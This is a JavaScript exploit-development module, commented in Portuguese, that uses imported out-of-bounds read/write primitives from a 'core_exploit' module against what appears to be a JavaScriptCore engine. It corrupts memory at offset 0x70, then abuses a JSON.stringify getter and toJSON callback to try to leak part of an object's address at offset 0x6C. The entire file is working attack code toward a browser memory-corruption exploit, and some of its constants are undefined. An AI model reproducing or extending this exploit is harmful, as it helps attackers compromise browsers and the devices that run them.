// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAddrOfLeakV5";
let getter_called_flag = false;
let current_test_results = { /* ... */ }; // Será definido no runner

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const TARGET_ADDR_OF_WRITE_OFFSET = 0x6C; 
// Padrão inicial para os 4 bytes baixos em 0x6C. Pode ser qualquer coisa,
// pois esperamos que seja sobrescrito se o leak funcionar.
const INITIAL_LOW_DWORD_AT_TARGET = 0xABABABAB; 

let object_to_leak_address_global; // Objeto cujo endereço queremos vazar (parte baixa)

class CheckpointFor0x6CAddrOfLeakV5 {
    constructor(id) {
        this.id_marker = `AddrOfLeakV5Chkpt-${id}`;
        this.prop_containing_target = null; // Será preenchido com object_to_leak_address_global
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "AddrOfLeakV5_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        // current_test_results_for_subtest é definido pelo runner
        if (!current_test_results_for_subtest) {
            logS3("ERRO FATAL GETTER: current_test_results_for_subtest não definido!", "critical", FNAME_GETTER);
            return;
        }
        current_test_results_for_subtest.message = "Getter chamado. Stringifier processou this.prop_containing_target.";
        let details_log_g = [];
        
        try {
            if (!oob_array_buffer_real || !oob_read_absolute || !oob_write_absolute) {
                throw new Error("Dependências OOB não disponíveis.");
            }
            
            // O JSON.stringify externo já processou 'this' e sua 'prop_containing_target'.
            // A escrita anômala em TARGET_ADDR_OF_WRITE_OFFSET (0x6C) já deve ter ocorrido.
            // Vamos ler e analisar o valor.
            logS3(`DENTRO DO GETTER: Lendo QWORD de oob_data[${toHex(TARGET_ADDR_OF_WRITE_OFFSET)}] para análise de AddrOf...`, "info", FNAME_GETTER);
            const value_at_target_qword = oob_read_absolute(TARGET_ADDR_OF_WRITE_OFFSET, 8);
            current_test_results_for_subtest.final_value_at_target_offset_hex = value_at_target_qword.toString(true);
            details_log_g.push(`Valor final em oob_data[${toHex(TARGET_ADDR_OF_WRITE_OFFSET)}]: ${current_test_results_for_subtest.final_value_at_target_offset_hex}`);
            logS3(details_log_g[details_log_g.length-1], "leak", FNAME_GETTER);

            if (value_at_target_qword.high() === 0xFFFFFFFF) {
                if (value_at_target_qword.low() !== INITIAL_LOW_DWORD_AT_TARGET && value_at_target_qword.low() !== 0) {
                    // A parte baixa mudou do padrão inicial E não é zero. Poderia ser parte de um endereço?
                    current_test_results_for_subtest.success = true;
                    current_test_results_for_subtest.message = `POTENCIAL ADDROF (PARCIAL)! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(value_at_target_qword.low())} (DIFERENTE do padrão inicial ${toHex(INITIAL_LOW_DWORD_AT_TARGET)}).`;
                    logS3(current_test_results_for_subtest.message, "vuln", FNAME_GETTER);
                } else if (value_at_target_qword.low() === INITIAL_LOW_DWORD_AT_TARGET) {
                    current_test_results_for_subtest.message = `Escrita em 0x6C confirmada (Alto FFFFFFFF), Baixo (${toHex(value_at_target_qword.low())}) preservado como padrão inicial. Sem vazamento de endereço óbvio.`;
                } else { // Baixo é 0
                     current_test_results_for_subtest.message = `Escrita em 0x6C (Alto FFFFFFFF), Baixo é 0. Padrão inicial era ${toHex(INITIAL_LOW_DWORD_AT_TARGET)}.`;
                }
            } else {
                 current_test_results_for_subtest.message = `Valor em 0x6C (${value_at_target_qword.toString(true)}) não teve Alto FFFFFFFF. Padrão baixo inicial era ${toHex(INITIAL_LOW_DWORD_AT_TARGET)}.`;
            }
            current_test_results_for_subtest.details_getter = details_log_g.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results_for_subtest.error = String(e_getter_main);
        }
        return { "getter_0x6C_addrof_v5_complete": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointFor0x6CAddrOfLeakV5.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        return { 
            id: this.id_marker, 
            stringified_target_prop: this.prop_for_stringify_target,
            processed_by_0x6c_addrof_v5_test: true 
        };
    }
}

let current_test_results_for_subtest; 

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "execute0x6CAddrOfLeakTestRunnerV5";
    logS3(`--- Iniciando Teste de AddrOf via Escrita em 0x6C (v5) ---`, "test", FNAME_TEST_RUNNER);

    // Este teste não faz loop de padrões, foca em uma única tentativa.
    getter_called_flag = false; 
    current_test_results_for_subtest = { 
        success: false, 
        message: `Testando se Stringifier vaza parte de endereço em ${toHex(TARGET_ADDR_OF_WRITE_OFFSET)}.`, 
        error: null, 
        initial_low_dword_at_target_hex: toHex(INITIAL_LOW_DWORD_AT_TARGET),
        final_value_at_target_offset_hex: null, 
        details_getter: ""
    };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) { 
        logS3("Offsets Críticos Ausentes", "critical", FNAME_TEST_RUNNER); return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute || !oob_read_absolute) { throw new Error("OOB Init ou primitivas R/W falharam"); }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Preencher a área de sondagem com um padrão geral, exceto 0x6C e 0x70
        const fill_limit = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
        for (let offset = 0; offset < fill_limit; offset += 4) {
            if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                (offset >= TARGET_ADDR_OF_WRITE_OFFSET && offset < TARGET_ADDR_OF_WRITE_OFFSET + 8) ) { 
                continue; 
            }
            try { oob_write_absolute(offset, OOB_AB_GENERAL_FILL_PATTERN, 4); } catch(e){}
        }
        // Escrever o padrão de teste específico nos 4 bytes baixos de 0x6C
        // E zerar os 4 bytes altos de 0x6C (que é o início de 0x70 se não houver padding)
        oob_write_absolute(TARGET_ADDR_OF_WRITE_OFFSET, INITIAL_LOW_DWORD_AT_TARGET, 4);
        if (TARGET_ADDR_OF_WRITE_OFFSET + 4 < oob_array_buffer_real.byteLength && 
            !(TARGET_ADDR_OF_WRITE_OFFSET + 4 >= CORRUPTION_OFFSET_TRIGGER && TARGET_ADDR_OF_WRITE_OFFSET + 4 < CORRUPTION_OFFSET_TRIGGER + 8) ) {
             oob_write_absolute(TARGET_ADDR_OF_WRITE_OFFSET + 4, 0x00000000, 4); 
        }
        const initial_qword_val_check = oob_read_absolute(TARGET_ADDR_OF_WRITE_OFFSET, 8);
        logS3(`oob_ab preenchido. oob_data[${toHex(TARGET_ADDR_OF_WRITE_OFFSET)}] (QWORD inicial) = ${initial_qword_val_check.toString(true)}.`, "info", FNAME_TEST_RUNNER);
        
        // 2. Objeto alvo global
        object_to_leak_address_global = { "unique_id_val": 0xFEEDFACE + Math.floor(Math.random()*0xFFF) };

        // 3. Escrita OOB Gatilho em 0x70
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointFor0x6CAddrOfLeakV5(1);
        checkpoint_obj.prop_for_stringify_target = object_to_leak_address_global; // Passar o objeto alvo
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        JSON.stringify(checkpoint_obj); // Aciona o getter

    } catch (mainError_runner) { 
        current_test_results_for_subtest.message = `Erro CRÍTICO no runner: ${mainError_runner.message}`;
        current_test_results_for_subtest.error = String(mainError_runner);
        logS3(current_test_results_for_subtest.message, "critical", FNAME_TEST_RUNNER);
        console.error(mainError_runner); 
    } finally {
        logS3(`FIM DO TESTE com padrão inicial ${toHex(INITIAL_LOW_DWORD_AT_TARGET)} em ${toHex(TARGET_ADDR_OF_WRITE_OFFSET)}`, "subtest", FNAME_TEST_RUNNER);
        if (getter_called_flag) {
            logS3(`  Resultado: Success=${current_test_results_for_subtest.success}, Msg=${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "vuln" : "warn", FNAME_TEST_RUNNER);
            if(current_test_results_for_subtest.final_value_at_target_offset_hex) {
                 logS3(`    Valor final em ${toHex(TARGET_ADDR_OF_WRITE_OFFSET)}: ${current_test_results_for_subtest.final_value_at_target_offset_hex}`, "leak", FNAME_TEST_RUNNER);
            }
             logS3(`    Detalhes do Getter: ${current_test_results_for_subtest.details_getter}`, "info", FNAME_TEST_RUNNER);
        } else {
            logS3(`  Resultado: GETTER NÃO FOI CHAMADO. Msg: ${current_test_results_for_subtest.message}`, "error", FNAME_TEST_RUNNER);
        }
        clearOOBEnvironment();
        object_to_leak_address_global = null;
    }

    logS3(`--- Teste de Análise da Escrita em 0x6C para AddrOf (v5) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
